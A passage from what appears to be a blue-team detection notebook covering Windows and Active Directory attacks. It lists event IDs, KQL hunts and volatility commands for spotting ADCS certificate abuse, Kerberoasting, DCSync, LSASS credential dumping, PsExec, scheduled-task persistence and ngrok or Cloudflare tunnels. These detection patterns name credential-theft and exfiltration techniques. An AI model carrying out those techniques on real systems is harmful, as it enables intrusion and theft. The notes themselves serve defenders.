  - enrollment rights granted to low-privilege users
  - an authentication EKU (Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose)
  - ability for the requestor to specify SANs

https://www.aceresponder.com/learn/adcs

#### via certsrv.msc

Launch `certsrv.msc` > Look at `issued certificates` > identify certificates that have a `Subject Alternative Name` - `Other Name` specified.

Taken from [here](https://www.aceresponder.com/learn/adcs)

#### via Windows Event Logs / Windows Filtering Event ID 5156

```
# Monitor for unusual activity to 'Network Information.Destination Address' and see who authenticated from that IP, the source workstation (eg Event ID 4624, 4776), etc.
EventID: 5156 (The Windows Filtering Platform has permitted a connection)
Application Information.Application Name: *\system32\certsrv.exe
```

#### via Windows Event Logs / Object Access (4886)

Pre-requiste: Requires the Windows Event Logging to be turned on.

```
# Look for unusual non-matching user name in `Requester` in the windows event log.
EventID = 4886 ("Certificate Services received a certificate request.")
Channel = Security
```
  
#### via Windows Audit Event Logs / ID 4768

- Could be useful to detect to detect certificate based authentication and compromise attempts for ESC1 and other ADCS vulnerabilities
- Happens when authentication is performed via a certificate obtained via ESC3 
  
```
# Certificate Information.Certificate Serial Name, Certificate Information.Thumbprint has the details
# Account Information.Account Name has the details as well of the account for which the certificate was requested
EventID = 4768 (A Kerberos authentication ticket (TGT) was requested.)
Channel = Security
Description = A Kerberos Authentication Ticket was requested
Additional Information.Pre-Authentication Type=16 ('Request sent to KDC in Smart Card authentication scenarios.') OR Certificate Information.Certificate Issuer Name = *
```

#### via Windows Event Logs / Object Access (4887)

Pre-requiste: Requires the Windows Event Logging to be turned on.

```
# Look for non-matching user name in `Requester` and subject alternative name (`Subject`), (`Attributes`) in the windows event log.
# SAN user name can also appear in subject alternative name
EventID = 4887 ("Object Access")
Channel = Security
Description: Certificate Services approved a certificate request and issued a certificate.
```

#### via Windows Event Logs / Object Access (4887) / ElasticSearch

```
event.code:4887 AND winlog.event_data.Attributes:*SAN\:*
```

Taken from [here](https://www.aceresponder.com/learn/adcs)

#### via RPC Firewall / Elastic search

Pre-requiste: Requires Zero Networks' [RPC Firewall](https://www.aceresponder.com/blog/disrupting-offensive-rpc) to be enabled.

```
winlog.provider_name:RPCFW AND event.code:3 AND winlog.event_data.arg_6.SubjectAltNames:*
```

See [here](https://www.aceresponder.com/blog/disrupting-offensive-rpc)

### Detect unusual Kerberos ticket request attempts

```
# For detecting Kerberoasting via service ticket requests - https://trustedsec.com/blog/art_of_kerberoast
Event ID 4769
Service Name not equal to 'krbtgt'
Service Name does not end with '$'
Account Name does not match '<MachineName>$@<Domain>'
Failure Code is '0x0'
Ticket Encryption Type is '0x17'
```

#### via Windows Event Logs / 4769

```
EventID = 4769 (A Kerberos service ticket was requested)
Channel = Security
Provider = Microsoft-Windows-Security-Auditing
```

### Detect ASREP Roasting Authentication Attempts

#### via Windows Audit Event Logs / ID 4768

```
EventID = 4768 (A Kerberos authentication ticket (TGT) was generated)
Additional Information.Ticket Encryption Type = 0x12
Service Information.Service Name = krbtgt
```

https://www.hackthebox.com/blog/as-rep-roasting-detection

### Detection of Active Directory Certificate Services Abuse - Any Purpose EKU (ESC2)

Any Purpose (OID 2.5.29.37.0), OR no EKU (SubCA)

#### via OID search

Search for `2.5.29.37.0` OR `SubCA` in all logs and focus on certificate services logs

### Detection of Active Directory Certificate Services Abuse - Certificate Request Agent (ESC3)

If an attacker gets a certificate with the Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`), they can enroll on behalf of another user. In other words, they can ask the CA to sign a certificate for a higher-privilege account.

#### via OID Search

Search for `1.3.6.1.4.1.311.20.2.1` in all logs and focus on certificate services logs

### Detection of unusual authentication attempts / logon attempts

- Look for excessive failed authentication attempts eg password spray or brute-force
- Look for authentication attempts for users and process (`Process Information.Process Name`) of LogonType=2 (Interactive logon locally) AND Impersonation Level = `Impersonation`. Could be indicative of local runas exploitation e.g. [RunasCs](https://github.com/antonioCoco/RunasCs)
- Look for PSExec attempts (which is typically `LogonType=5`)
- Look for non-null source network address as these are likely malicious attempts (`LogonType=3`)
- Look for authentication attempts from hostnames (e.g. `DESKTOP-XXX`) OR IP addresses if your company which do not follow the naming convention for hostnames including in any VPN logs eg [stephan berger's linkedin post](`https://www.linkedin.com/posts/stephan-berger-59575a20a_another-fun-one-the-user-runs-an-installer-activity-7225755841981755392-CnlB/?utm_source=share&utm_medium=member_ios`).  For VPN, see GlobalProtect log field `Machine Name` in format [here](https://docs.paloaltonetworks.com/pan-os/10-2/pan-os-admin/monitoring/use-syslog-for-monitoring/syslog-field-descriptions/globalprotect-log-fields)
- Look for overpass-the-hash attempts as described [here](https://detection.fyi/sigmahq/sigma/windows/builtin/security/account_management/win_security_overpass_the_hash/)
- To identify brute-force sweeps e.g. SMB sweep / password spray, Look for logon for a username across multiple hosts in a short period of time

#### via Windows Event Logs / hayabusa / 4624, 4625

```
cd C:\Users\azureuser\Desktop\opt\hayabusa
.\hayabusa-3.0.1-win-x64.exe logon-summary --directory C:\Windows\System32\winevt\Logs
```

#### via Windows Event Logs / 4624, 4625

```
# Look for logons across multiple hosts over a short period 

Channel = Security
EventID=4624 (An account was successfully logged on) OR 4625 (An account failed to log on)
LogonType = 2 (Interactive) OR 3 (Network) OR 5 (Service started by Service Control Manager) 8 (NetworkClearText)

OR

# Overpass-the-hash detection (https://detection.fyi/sigmahq/sigma/windows/builtin/security/account_management/win_security_overpass_the_hash/)
EventID = 4624
LogonType = 9 (NewCredentials)
LogonProcessName = seclogo
AuthenticationPackageName = Negotiate
```

Taken from [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625#_Ref433822321)

#### via haybusa

```
cd /opt/hayabusa
./hayabusa logon-summary -f /root/samples/winlogs/Security.evtx
```

https://github.com/Yamato-Security/hayabusa/releases/tag/v3.1.1

#### via Windows Event Logs / 4771, 4776

- Very good for identification of password brute-force attempts via tools like kerbrute, crackmapexec

```
# 'Logon Account' field shows the username that was attempted
Channel = Security
EventID = 4776 (The computer attempted to validate the credentials for an account.)

# Account Information.Account Name contains the name of the account that was attempted
Channel = Security
EventID = 4771 (Kerberos Pre-Authentication failed.)
```

#### via Microsoft Defender Advanced Threat Hunting / KQL

```
DeviceLogonEvents
| project Timestamp, DeviceId, ReportId, DeviceName, AccountDomain, AccountName, LogonType, ActionType, RemoteIP, AdditionalDetails
| sort by Timestamp desc 
```

### Detection of PSExec usage to authenticate

https://www.hackthebox.com/blog/how-to-detect-psexec-and-lateral-movements

Along with these detections, look for EventID=`4624` and logontype=`5` (Service startup) to identify which user may have performed this `PSExec.exe` authentication

Detections mostly taken from: https://www.hackthebox.com/blog/how-to-detect-psexec-and-lateral-movements

#### via Windows Sysmon Event Logs / 1

```
EventID = 1 (Process Create)
Channel = Microsoft-Windows-Sysmon/Operational
ParentImage: C:\Windows\System32\services.exe
CommandLine = C:\Windows\PSEXESVC.exe
```

#### via Windows Sysmon Event Logs / 13

```
Channel = Microsoft-Windows-Sysmon/Operational
EventID = 13 (Registry Value Set)
EventType = SetValue
Image = C:\Windows\system32\services.exe
TargetObject = HKLM\System\CurrentControlSet\Services\PSEXESVC\Start
```

#### via Windows Sysmon Event Logs / 11

```
Channel = Microsoft-Windows-Sysmon/Operational
EventID = 11 (File created)
TargetFilename = C:\Windows\PSEXESVC.exe
```

#### via Windows Event Logs / 7036

```
EventID = 7036 (The PSEXESVC service entered the running state.)
Channel = System
```

### Detection of Active Directory Certificate Services Abuse - Template Modification (ESC4), Other Attacks

- Since templates are securable AD objects, an attacker with control can abuse them like any other AD object.
    - Eg. an attacker can effectively make a template vulnerable to ESC1 and request a user with a SAN. ESC1 behavior is set by the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag in the template’s ms-PKI-Certificate-Name-Flag property.
  
#### via Windows Event Logs / 4900 (Changes to Certificate Security Descriptor / ACL)

```
Channel = Security
EventID = 4900 (Certificate Services template security was updated)
```

Example of this Event ID is [here](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4900)

#### via Windows Event Logs / 4899 (Changes to Certificate Template)

```
Channel = Security
EventID = 4899 (A Certificate Services template was updated)
```

Example of this event ID is [here](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4899)

#### via Windows Event Logs / 4662 (An operation was performed on an object)

Pre-requisite: Requires that the object audit logging is enabled via `auditpol /set` and also auditing enabled for `ADSI Edit > Action > Connect to... > Select 'Configuration' in Naming Context instead of Default > CN=Services > CN=Public Key Services > CN=Certificate Templates`. Taken from [here](https://labs.lares.com/adcs-exploits-investigations-pt1/#audit-certificate-templates-modification-operations)

```
# Look at the Account Name for the person that made the change. ms-PKI-Certificate-Name-Flag = {ea1dddc4-60ff-416e-8cc0-17cee534bce7} which is used for introducing ESC1 vulnerability (SAN)
EventID = 4662 (An operation was performed on an object)
Channel = Security
Operation.Properties = "*Write-Property*"
# Records changes to 'PKI-Certificate-Template' OR 'ms-PKI-Certificate-Name-Flag'
Operation.Properties = "*{ea1dddc4-60ff-416e-8cc0-17cee534bce7}*" OR "*{e5209ca2-3bba-11d2-90cc-00c04fd91ab1}*"
```

#### via RPC Firewall logs / RPCFW:3

```
# If using RPC Firewall
winlog.provider_name:RPCFW AND event.code:3 AND carol
```

### Detection of unusual AD objects accessed

- To detect `DCSync`, look for changes to the following properties:
```
Object Server: DS
# Domain-DNS
Object.Object Type: "{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
# DS-Replication-Get-Changes-In-Filtered-Set, DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, DS-Replication-Get-Changes-In-Filtered-Set
Operation.Properties: {89e95b76-444d-4c62-991a-0facbeda640c} OR {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} OR {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} OR {89e95b76-444d-4c62-991a-0facbeda640c}
```

#### via Windows Event Logs / 4662

```
# Subject.Account Name has the user account which performs DCSync
Event ID: 4662 (An operation was performed on an object)
```

Taken from [here](https://blog.blacklanternsecurity.com/p/detecting-dcsync)

### Detection of Skeleton Key 

- To prevent skeleton key, need to ensure that Protected Process is switched on to only allow Microsoft Signed Processes to inject into LSA
- Protect domain admin accounts carefully as that is a pre-requisite

  
#### via Windows Event Logs / 4673,4611 Event IDs

```
Event ID: 4673 (Sensitive Privilege Use)
Service Name: LsaRegisterLogonProcess()
Process: C:\Windows\System32\lsass.exe
```

```
# This means that requests for logon will go to the LSA for a new process
# Created very close to the previous event
Event ID: 4611 (A trusted logon process has been registered with the Local Security Authority.)
```

Taken from [here](https://adsecurity.org/?p=1275)

### Google Chrome Browser Browser Sync

Browser Sync could lead to passwords, bookmarks, history, etc to be shared when user logs into other browsers. 

#### via Chrome registry

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome
```

If value `SyncDisabled DWORD` set to 0 OR not present then Enabled.

Otherwise, it is Disabled.

#### via Google Chrome Browser UI 

Click on Google Chrome browser > Turn On Sync... > Settings > Manage What you Sync

### Scheduled Tasks Deletion

Can be a persistence mechanism for threat actors cleaning up after.

#### via Windows Event Logs / TaskScheduler

```
Event ID: 141
Channel: Microsoft-Windows-TaskScheduler/Operational
Description: User "HACKER\$USERNAME"  deleted Task Scheduler task "\$TASK_NAME"
```

#### via Windows Event Logs / Sysmon / Registry Deleted

```
Event ID: 12 (Registry Object Added or Deleted)
EventType: DeleteKey
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask
Channel: Microsoft-Windows-Sysmon/Operational
```

### Scheduled Tasks Creation

Can be a persistence mechanism for threat actors OR even launching of shells from tools like [impacket-atexec](https://github.com/manasmbellani/Blue-Team-Notes/blob/main/Examples%20Of%20Lateral%20movement.md)

Most detection techniques taken from [here](https://www.binarydefense.com/resources/blog/diving-into-hidden-scheduled-tasks/)

#### via HKLM registry / TaskCache\Tree

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TASK_NAME"
```

#### via powershell \ HKLM registry / TaskCache\Tasks

```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\
```

```
# Get the path from each GUID e.g. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{FB85EA40-DB41-49E9-9FE6-17D5793EB1A1} under TaskCache\Tasks
# Can get further details with reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{FB85EA40-DB41-49E9-9FE6-17D5793EB1A1}"
$KEY = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"

Get-ChildItem -Path $KEY | ForEach-Object {
    $GUID = $_.PSChildName
    $Path = (Get-ItemProperty -Path "$KEY\$GUID").Path
    Write-Output "GUID: $GUID"
    Write-Output "Path: $Path"
    Write-Output "`n"
}
```

#### via Windows Defender / KQL / Creations / DeviceEvents

```
# Creation of new scheduled tasks
let ScheduledTasks = materialize (
DeviceEvents
| where ActionType contains "ScheduledTaskCreated"
| extend TaskName = extractjson("$.TaskName", AdditionalFields, typeof(string))
| extend TaskContent = extractjson("$.TaskContent", AdditionalFields, typeof(string))
| extend SubjectUserName = extractjson("$.SubjectUserName", AdditionalFields, typeof(string))
| extend Triggers = extractjson("$.Triggers", TaskContent, typeof(string))
| extend Actions = extractjson("$.Actions", TaskContent, typeof(string))
| extend Exec = extractjson("$.Exec", Actions, typeof(string))
| extend Command = extractjson("$.Command", Exec, typeof(string))
| extend Arguments = extractjson("$.Arguments", Exec, typeof(string))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, TaskName, Command, Arguments, SubjectUserName, Triggers
);
ScheduledTasks
| summarize count() by Command, Arguments
| where count_ < 3
| join ScheduledTasks on Command, Arguments
| project-away Command1, Arguments1
```

https://threathunt.blog/hunting-for-malicious-scheduled-tasks/

#### via Windows Defender / KQL / Task Executions / DeviceProcessEvents

```
let RunningScheduledTasks = materialize(
DeviceProcessEvents
| where InitiatingProcessFileName == @"svchost.exe"
| where InitiatingProcessCommandLine == @"svchost.exe -k netsvcs -p -s Schedule"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ProcessId, FolderPath
| where FileName != @"MpCmdRun.exe"
| where FolderPath !startswith @"C:\Windows\System32\" or FileName =~ "cmd.exe" or FileName =~ "powershell.exe" or FileName =~ "rundll32.exe" or FileName =~ "regsvr32.exe"
);
RunningScheduledTasks
| summarize count() by FileName, ProcessCommandLine, FolderPath
| where count_ < 10
| join RunningScheduledTasks on FileName, ProcessCommandLine, FolderPath
| project Timestamp, DeviceName, FileName, ProcessCommandLine, FolderPath, AccountName, count_
```

https://threathunt.blog/hunting-for-malicious-scheduled-tasks/

#### via powershell / Get-ScheduledTask

```
# List all tasks
Get-ScheduledTask > C:\Windows\System32\powershell-schtasks.txt

# View further details about the task
powershell -ep bypass "(Get-ScheduledTask $TASK_NAME).Actions" | more
```

#### via Windows Event Logs / TaskScheduler Logs / Event ID 1 / Event ID 4688

```
# Look for tasks where Parent Command Line is "svchost.exe -k netsvcs -p -s Schedule"
# See 'Windows Defender / KQL / Creations' for more details
```

https://threathunt.blog/hunting-for-malicious-scheduled-tasks/

#### via Windows Event Logs / TaskScheduler Logs

```
Event ID: 106 (User "HACKER\$USERNAME"  registered Task Scheduler task "\$TASK_NAME")
Channel: Microsoft-Windows-TaskScheduler/Operational
```

```
# When an instance of the task is launched - it is also indicative of the task being executed
Event ID: 100 (Task Scheduler started instance of the '$TASK_NAME' task)
Channel: Microsoft-Windows-TaskScheduler/Operational

# Captures the command line for this task
Event ID: 200 (Task Scheduler launched action $CMDLINE of task '$TASK_NAME')
Channel: Microsoft-Windows-TaskScheduler/Operational
```

#### via Windows Event Logs / Sysmon / Process Create

```
Event ID: 13 (Registry Value Set)
Channel: Microsoft-Windows-Sysmon/Operational
CommandLine: *\schtasks.exe*/create*
```

#### via Windows Sysmon Event Logs / Image Loaded / Event ID 7

```
# Look for creation of taskschd.dll which identifies the images being loaded
# See Image Loaded / Event ID 7 above
```

#### via Windows Event Logs / A scheduled task has been created / 4698

```
# Contains XML format of the tasks created
Event ID: 4698 (A scheduled task was created)
Channel: Security
Provider: Microsoft-Windows-Security-Auditing
```

#### via Windows Event Logs / Sysmon / Event ID 7 / TaskCache\Tasks, TaskCache\Tree

```
Event ID: 13 (Registry Value Set)
Channel: Microsoft-Windows-Sysmon/Operational
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$TASK_GUIDE\Path OR HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TestTask\SD
```

#### via schtasks.exe

```
schtasks.exe > C:\Windows\System32\schtasks.txt
```

Taken from [here](https://www.binarydefense.com/resources/blog/diving-into-hidden-scheduled-tasks/)

### Detect commands executed from RDP remote sessions

#### via KQL

```
DeviceProcessEvents 
| where Timestamp >= ago(1d) 
| where IsInitiatingProcessRemoteSession == "True"
```

https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/detect-compromised-rdp-sessions-with-microsoft-defender-for/ba-p/4201003

### Detect RDP Authentication Sessions

Taken from [here](https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/)


#### via Windows Event Logs / Microsoft-Windows-TerminalServices-LocalSessionManager/Operational / EventID 21

```
# 'User' field contains the username and 'Source Network Address' contains the client IP
EventID: 21 (Remote Desktop Services: Session logon succeeded)
Channel: Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
```

https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/


#### via Windows Event Logs / Microsoft-Windows-TerminalServices-LocalSessionManager/Operational / EventID 25

```
# 'User' field contains the username and 'Source Network Address' contains the client IP
EventID: 25 (Remote Desktop Services: Session reconnection succeeded)
Channel: Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
```

https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/

#### via Windows Event Logs / Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational

```
# 'User' field contains the username and 'Source Network Address' contains the client IP
EventID: 1149 (Remote Desktop Services: User authentication succeeded)
Channel: Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
```

https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/

#### via Windows Event Logs / Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational

```
# Source IP/port shown in Description as 'The server accepted a new TCP connection from client x.x.x.x:y'
EventID: 131 (The server accepted a new TCP connection)
Channel: Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational
```

#### via Windows Event Logs / sysmon / Event ID 3 (Network Connection)\

```
# 'SourceIp' field contains the client IP address
EventID: 3 (Network Connection Detected)
Channel: Microsoft-Windows-Sysmon/Operational
DestinationPort: 3389
```


### Detect Timestomping / Filesystem time changes

#### via sysmon / windows event logs

Use `powershell` to display the creation, modification, accessed dates

```
Get-Item -Path C:\Windows\Temp\test.txt | Format-List
```

```
# Image attribute lists full path of the process that changed timestamp and TargetFileName lists the Filename
EventID: 2 (File Creation Time changed)
Channel: Microsoft-Windows-Sysmon/Operational
```

#### via various methods for created and deleted files

See [here](#check-created-and-deleted-files)

### Detect authentication attempts indicating credential dumping

#### via Windows Event Logs / Sysmon

Can be used to detect tools like `go-secdump` used for dumping various credentials like LSA, SAM.

```
Event ID: 18 (Pipe Connected)
Channel: Microsoft-Windows-Sysmon/Operational
PipeName: \ntsvcs OR \winreg
EventType: connect
```

### Identify and Recover Deleted files

See [here](../linux_compromised_host#identify-and-recover-deleted-files-from-disk)

### Detect Disabling Windows Defender

#### via Windows Event Logs / Sysmon / Registry

The `Image` field for the log below shows the process attempting to disable Defender RealTime Monitoring
```
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 13 (Registry value set)
TargetObject: HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring
```

```
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 13 (Registry value set)
TargetObject: HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet\SpyNetReporting
```

### Detect Blocking of Windows Defender

#### via Windows Event Logs 

Check the `Rule ID`, `Rule Name` and `Application Path` - ensure that it is not an AV related path e.g. `C:\Program Files\Windows Defender Advanced Threat Protection\SenseCncProxy.exe`

```
Channel: Microsoft-Windows-Windows Firewall With Advanced Security/Firewall
Event ID: 2097 (A rule has been added to the Windows Defender Firewall exception list.)
```

Taken from [here](https://github.com/LearningKijo/ResearchDev/blob/main/DEV/DEV03-FirewallTampering/Dev03-FirewallTampering.md)

### Clear Windows Event Logs

#### via Windows Event Logs

```
Channel: System
EventID: 104 (System Log File was cleared)
```

### Detect LSA Dumping

#### via remote registry key enabling / Windows Event ID 7036

```
Event ID = 7036
Channel = System
Description = "Remote Registry Key service entered the running state"
```

### Detect unusual process accessed from another process (eg LSASS)

- Look for `UNKNOWN` in SYSMON's calltrace field which can be indicative DLL memory injection as discussed [thedfirreport.com](https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/#credential-access)

- Look for `DBGHelp.dll` or `DBGCore.dll` into `lsass.exe` which both export `MiniDumpWriteDump` method that can be used to dump LSASS memory content as discussed [elastic.co](https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-0-14-3-potential-credential-access-via-lsass-memory-dump.html)

- Access from `werfault.exe` into `lsass.exe` is high indication of mimikatz, nanodump, invoke-mimikatz access as discussed in [github.com](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lsass_werfault.yml)

#### via Windows Event Logs / Sysmon Event ID 10

```
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 10 (Process Accessed)
TargetImage: C:\Windows\System32\lsass.exe
```

#### via Windows Event Logs / Event ID 4611

```
# Observe events around this to identify malicious process
Channel: Security
EventID: 4611 (A trusted logon process has been registered with the Local Security Authority.)
Logon Process Name: User32LogonProcesss
```

#### via Windows Event Logs / Event ID 4673

```
# Observe events around this to event
Channel: Security
EventID: 4673 (A privileged service was called.)
Logon Process Name: LsaRegisterLogonProcess()
Process.Process Name: *\lsass.exe
```

#### via Windows Event Logs / Event ID 4656

### Operating System Information / Banners

#### via volatility3 / windows.info.Info

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem windows.info.Info
deactivate
```

#### via volatility2 / imageinfo

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem imageinfo
deactivate
```

#### via volatility2 / kdbgscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem kdbgscan
deactivate
```

#### via volatility3 / banners.Banners

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem banners.Banners
deactivate
```

### Get supported volatility profiles

#### via volatility2 / info

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --info
deactivate
```

#### via volatility2 website

See https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles

### Process Tree / Process Listing

#### via volatility3 / pslist

We are able to review the live `.raw` RAM collected via any of the live collection methods using volatility3 with commands as follows via `volatility3` to list current processes:
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/TEST-WIN-INSTAN-20240315-062005.raw windows.pslist.PsList
deactivate
```

#### via volatility2 / psxview

Can also help detect hidden processes

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f ~/vulnhub/letsdefend/randev/RanDev.vmem psxview
deactivate
```

More info: https://www.oreilly.com/library/view/digital-forensics-and/9781787288683/4732c6ac-0f3c-44b9-bce8-949352ed3755.xhtml

#### via volatility3 / psscan

Able to also find hidden processes unlinked from rootkits
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.psscan.PsScan
deactivate
```

#### via volatility3 / pstree

We are also able to see the process from live `.raw` RAM as a tree like structure using `volatility3`:
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/TEST-WIN-INSTAN-20240315-062005.raw windows.pstree.PsTree
deactivate
...
******* 1244    5220    PsExec.exe      0xcf830d644080  6       -       2       True    2024-03-15 06:19:57.000000      N/A     \Device\HarddiskVolume3\Users\manasbellani\Downloads\SysinternalsSuite\PsExec.exe   PsExec.exe  -s -i cmd.exe       C:\Users\manasbellani\Downloads\SysinternalsSuite\PsExec.exe
...
```

### Get Directory Table Base (DTB) for a process

See [here](#get-directory-table-base-dtb-for-a-kernel) for info on what DTB is

#### via volatility2 / volshell

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f ~/vulnhub/letsdefend/randev/RanDev.vmem volshell -p 880 
deactivate
```

### Detect unusual Network DNS queries

- Look for unusual DNS lookups e.g.
```
# Indicative of ngrok usage within Windows. See https://www.huntress.com/blog/abusing-ngrok-hackers-at-the-end-of-the-tunnel
ngrok-agent.com
# equinox.io is for distributing Golang packaged apps eg ngrok. See https://equinox.io, https://ngrok.com/docs/guides/device-gateway/linux/
equinox.io
# CloudFlared - https://x.com/malmoeb/status/1736995855482118314, https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
argotunnel.com
```

- Look for unusual processes making DNS queries which can be indicative of C2 implants making outbound connectivity e.g.
```
# For e.g. with excel canarytokens from canarytokens.org
Excel.exe
Word.exe
powershell.exe
```

#### via Microsoft Windows Defender Advanced Threat Hunting / KQL

```
DeviceNetworkEvents
| where DeviceName contains "laptop-name"
//| where InitiatingProcessFileName == "msedge[.]exe"
| where InitiatingProcessFileName == "chrome[.]exe"
| where RemoteUrl != ""
```

Taken from [here](https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/get-users-browser-history-via-live-response/m-p/3950769)

#### via Windows Event Sysmon Logs / EventID 22

```
EventID=22
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via ETW / Volatility3 / JPCERT's etw-scan / tracefmt

See [here](#via-etw--volatility3--jpcerts-etw-scan--tracefmt)

### Detect unusual Network Connections / Sockets

- Look for unusual connectivity to domains that setup tunnels which can be used for data exfiltration or internal access to environment eg Visual Studio Tunnels: https://lottunnels.github.io/

- Look for unusual outbound connectivity via network connection logs e.g.

```
# As discussed [here](https://www.linkedin.com/posts/stephan-berger-59575a20a_another-fun-one-the-user-runs-an-installer-activity-7225755841981755392-CnlB/?utm_source=share&utm_medium=member_ios)
FTP (port 21)

# E.g. for ocnnectivity to ngrok agents, as an example
Destination IP: Amazon IP addresses

# Look for outbound internet connectivity from unusual processes
'wscript.exe','mshta.exe','cscript.exe','conhost.exe','runScriptHelper.exe', 'powershell.exe'

# Lookup data using Threat intelligence for domain / IP connectivity as shown here
# https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules/blob/main/Threat%20Hunting/TI%20Feed%20-%20ThreatviewioDomain-High-Confidence-Feed.md

# Mapping against threat fox threat intel, look for top detections and less frequent destinations
```

#### via Microsoft Windows Defender / Live Response

```
Initiate Live Response > command is 'connections'
```

#### via Microsoft Windows Defender Advanced Threat Hunting / KQL

```
# Looks for remote connectivity from unusual processes
# Taken from: https://x.com/NathanMcNulty/status/1847000466712133959
DeviceNetworkEvents
| where ActionType == 'ConnectionSuccess'
| where RemoteIPType == 'Public'
| where InitiatingProcessVersionInfoOriginalFileName in~ ('wscript.exe','mshta.exe','cscript.exe','conhost.exe','runScriptHelper.exe', 'powershell.exe')
```

```
# Threat Intelligence Lookup via external data lookup
# Taken from: https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules/blob/main/Threat%20Hunting/TI%20Feed%20-%20ThreatviewioDomain-High-Confidence-Feed.md
let ThreatIntelFeed = externaldata(Domain: string)[@"https://threatview.io/Downloads/DOMAIN-High-Confidence-Feed.txt"] with (format="txt", ignoreFirstRecord=True);
let IPRegex = '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}';
DeviceNetworkEvents
| take 100
| where tolower(RemoteUrl) has_any (ThreatIntelFeed2)
| extend GeoIPInfo = geo_info_from_ip_address(RemoteIP)
| extend country = tostring(parse_json(GeoIPInfo).country), state = tostring(parse_json(GeoIPInfo).state), city = tostring(parse_json(GeoIPInfo).city), latitude = tostring(parse_json(GeoIPInfo).latitude), longitude = tostring(parse_json(GeoIPInfo).longitude)
| project-reorder TimeGenerated, DeviceName, RemoteIP, RemotePort, InitiatingProcessAccountName
```

```
# Basic 'ThreatIntelligenceIndicator' example with table of indicators to block
DeviceEvents
| where ActionType == "AntivirusDetection"
| extend AdditionalFieldsJson = parse_json(AdditionalFields)
| project SHA1, FileName
| join kind=innerunique (
    ThreatIntelligenceIndicator
    | project FileHashType, FileHashValue, Description
) on $left.SHA1 == $right.FileHashValue
```

```
DeviceNetworkEvents
| where DeviceName contains "testvm2"
| where InitiatingProcessFileName == "iexplore.exe"
| sort by Timestamp desc
```

#### via Windows Event Sysmon Logs / Event ID 3

```
EventID = 3 (Network Connection)
Channel = Microsoft-Windows-Sysmon/Operational
```

#### via volatility2 / netscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem netscan
deactivate
```

